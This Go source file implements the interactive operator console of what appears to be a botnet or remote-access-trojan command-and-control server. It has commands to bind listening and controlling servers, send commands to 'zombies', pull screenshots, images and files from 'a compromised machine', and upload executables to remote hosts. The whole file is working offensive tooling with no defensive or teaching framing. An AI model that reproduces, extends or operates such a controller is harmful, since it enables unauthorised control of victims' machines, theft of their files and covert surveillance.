package Server

import (
	"fmt"
	"github.com/c-bata/go-prompt"
	"log"
	"os"
	"strings"
)

func executor(input string) {
	input = strings.TrimSpace(input)
	inp := strings.Split(input, " ")

	switch inp[0] {
	case "":
		fmt.Print("")

	case "listen":
		listenToID(inp, &CId)
	case "q!":
		fmt.Println("\nExiting")
		os.Exit(0)
	case "list":
		list(inp)
	case "set":
		if len(inp) < 3 {
			log.Println("Uncompleted set command.")

		} else {
			if err := setValue(inp[1], inp[2]); err != nil {
				log.Println("Unable to set:", err)
			}
		}
	case "get":
		if err := getFile(inp, CId); err != nil {
			log.Println("Unable to get the image:", err)
		}
	case "bind":
		go bindPort(inp[1:])
	case "send":
		sendCommandToZombies(inp[2:])
	case "kill":
		kill(inp[1:])

	case "import":
		importScript(inp[1])
	case "upload":
		if CId == "" {
			fmt.Println("You must specify a session ID before attempting to send a command.")
			return
		}
		upload(inp, CId)
	default:
		if CId == "" {
			fmt.Println("You must specify a session ID before attempting to send a command.")
			return
		}

		chs[CId] <- input
		if output, open := <-chs[CId]; !open {
			fmt.Print("The channel is closed.\n")
		} else {
			fmt.Println(output)
		}
	}

}

func completer(d prompt.Document) []prompt.Suggest {
	beforeCursor := d.TextBeforeCursor()
	words := strings.Split(beforeCursor, " ")
	if len(words) == 1 {
		suggestions := []prompt.Suggest{
			{Text: "bind", Description: "Set up a server on a specified port."},
			{Text: "import", Description: "Execute a script file."},
			{Text: "listen", Description: "Specify a session ID."},
			{Text: "list", Description: "list all the active sessions/or controlling servers."},
			{Text: "get", Description: "Retrieve an object from a compromised machine."},
			{Text: "set", Description: "Assign a value"},
			{Text: "send", Description: "Send a command (or a set of commands) from a controlling server."},
			{Text: "kill", Description: "Terminate a server."},
			{Text: "upload", Description: "To upload a file to a remote machine."},
			{Text: "q!", Description: "Exit the shell."},
		}

		return prompt.FilterHasPrefix(suggestions, d.GetWordBeforeCursor(), true)
	}
	if words[0] == "listen" && len(words) == 2 {
		suggestions := []prompt.Suggest{}
		for i, _ := range dt {
			suggestions = append(suggestions, prompt.Suggest{Text: i, Description: "Session ID."})
		}
		return prompt.FilterHasPrefix(suggestions, d.GetWordBeforeCursor(), true)

	}
	if words[0] == "list" {
		if len(words) == 2 {
			suggestions := []prompt.Suggest{{Text: "sessions", Description: "To list all the active sessions."},
				{Text: "servers", Description: "To list all the active controlling or listening servers."}}
			return prompt.FilterHasPrefix(suggestions, d.GetWordBeforeCursor(), true)
		}
		if len(words) == 3 && words[1] == "servers" {
			suggestions := []prompt.Suggest{{Text: "listening", Description: "To list all the active listening servers."},
				{Text: "controlling", Description: "To list all the active controlling servers."}}
			return prompt.FilterHasPrefix(suggestions, d.GetWordBeforeCursor(), true)

		}
	}
	if words[0] == "get" {
		if len(words) == 2 {
			suggestions := []prompt.Suggest{
				{Text: "screenshots", Description: "Get screenshots."},
				{Text: "image", Description: "Get an image from disk."},
				{Text: "file", Description: "Get a file from disk."},
			}
			return prompt.FilterHasPrefix(suggestions, d.GetWordBeforeCursor(), true)
		}
		if len(words) == 3 && words[1] != "screenshots" {
			{
				suggestions := []prompt.Suggest{{Text: "<file name>", Description: "Specify the file name to get, multiple files separated by commas."}}
				return prompt.FilterHasPrefix(suggestions, d.GetWordBeforeCursor(), true)
			}
		}
	}
	if words[0] == "set" {

		if len(words) == 2 {
			suggestions := []prompt.Suggest{
				{Text: "out", Description: "The output directory."},
				{Text: "port", Description: "The default port number to bind to."},
				{Text: "timeout", Description: "The deadline for an expected message to be received."},
			}
			return prompt.FilterHasPrefix(suggestions, d.GetWordBeforeCursor(), true)
		}
		if len(words) == 3 {
			if words[1] == "out" {
				suggestions := []prompt.Suggest{
					{Text: "<dir>", Description: fmt.Sprintf("Output directory[=%s].", outputDir)},
				}
				return prompt.FilterHasPrefix(suggestions, d.GetWordBeforeCursor(), true)
			}
			if words[1] == "port" {
				suggestions := []prompt.Suggest{{Text: "<port number>", Description: fmt.Sprintf("Port number (1-65535). [=%s]", defaultPortNumber)}}
				return prompt.FilterHasPrefix(suggestions, d.GetWordBeforeCursor(), true)
			}
			if words[1] == "timeout" {
				suggestions := []prompt.Suggest{{Text: "<time (int)>", Description: fmt.Sprintf("Time (in seconds). [=%s]", timeout.String())}}
				return prompt.FilterHasPrefix(suggestions, d.GetWordBeforeCursor(), true)
			}
		}

	}
	if words[0] == "bind" {
		if len(words) == 2 {
			suggestions := []prompt.Suggest{
				{Text: "listening", Description: "Set up a listening server."},
				{Text: "controlling", Description: "Set up a controlling server."}}
			return prompt.FilterHasPrefix(suggestions, d.GetWordBeforeCursor(), true)
		}
		if len(words) == 3 {
			suggestions := []prompt.Suggest{{Text: "<port number>", Description: fmt.Sprintf("Port number (1-65535). [=%s]", defaultPortNumber)}}
			return prompt.FilterHasPrefix(suggestions, d.GetWordBeforeCursor(), true)
		}
		if len(words) == 4 {
			suggestions := []prompt.Suggest{{Text: "named", Description: "To name the server."}}
			return prompt.FilterHasPrefix(suggestions, d.GetWordBeforeCursor(), true)
		}
		if len(words) == 5 {
			suggestions := []prompt.Suggest{{Text: "<name>", Description: "The name of the server."}}
			return prompt.FilterHasPrefix(suggestions, d.GetWordBeforeCursor(), true)
		}
	}

	if words[0] == "send" {
		if len(words) == 2 {
			suggestions := []prompt.Suggest{{Text: "To", Description: ""}}
			return prompt.FilterHasPrefix(suggestions, d.GetWordBeforeCursor(), true)
		}
		if len(words) == 3 {
			suggestions := []prompt.Suggest{}
			for k, _ := range controllingServers {
				suggestions = append(suggestions, prompt.Suggest{Text: k, Description: "A controlling server."})
			}
			return prompt.FilterHasPrefix(suggestions, d.GetWordBeforeCursor(), true)
		}
		if len(words) == 4 {
			suggestions := []prompt.Suggest{{Text: "command", Description: "To send a single command."},
				{Text: "file", Description: "To send a file containing a set of commands"},
			}
			return prompt.FilterHasPrefix(suggestions, d.GetWordBeforeCursor(), true)

		}
		if words[3] == "command" {
			suggestions := []prompt.Suggest{{Text: "<command>", Description: "A single command to be sent."}}
			return prompt.FilterHasPrefix(suggestions, d.GetWordBeforeCursor(), true)

		} else if words[3] == "file" {
			suggestions := []prompt.Suggest{{Text: "<file>", Description: "The file(s) to be sent."}}
			return prompt.FilterHasPrefix(suggestions, d.GetWordBeforeCursor(), true)
		}

	}
	if words[0] == "import" {
		if len(words) == 2 {
			suggestions := []prompt.Suggest{{Text: "<file>", Description: "A text file containing the script."}}
			return prompt.FilterHasPrefix(suggestions, d.GetWordBeforeCursor(), true)
		}
	}
	if words[0] == "kill" {
		if len(words) == 2 {
			suggestions := []prompt.Suggest{{Text: "controlling", Description: "To kill a controlling server."},
				{Text: "listening", Description: "To kill a listening server."}}
			return prompt.FilterHasPrefix(suggestions, d.GetWordBeforeCursor(), true)

		}
		if len(words) == 3 && words[1] == "controlling" {
			suggestions := []prompt.Suggest{}
			for k, _ := range controllingServers {
				suggestions = append(suggestions, prompt.Suggest{Text: k, Description: "A controlling server."})
			}
			return prompt.FilterHasPrefix(suggestions, d.GetWordBeforeCursor(), true)
		}
		if len(words) == 3 && words[1] == "listening" {
			suggestions := []prompt.Suggest{}
			for k, _ := range listeningServers {
				suggestions = append(suggestions, prompt.Suggest{Text: k, Description: "A listening server."})
			}
			return prompt.FilterHasPrefix(suggestions, d.GetWordBeforeCursor(), true)

		}

	}
	if words[0] == "upload" {
		if len(words) == 2 {
			suggestions := []prompt.Suggest{{Text: "file", Description: "Upload a text/script file."},
				{Text: "executable", Description: "To upload an executable."}}
			return prompt.FilterHasPrefix(suggestions, d.GetWordBeforeCursor(), true)

		} else {
			suggestions := []prompt.Suggest{{Text: "<path>", Description: "The path."}}
			return prompt.FilterHasPrefix(suggestions, d.GetWordBeforeCursor(), true)

		}
	}
	return []prompt.Suggest{}
}

func inputParser() {
	prompt.New(
		executor,
		completer,
	).Run()
}
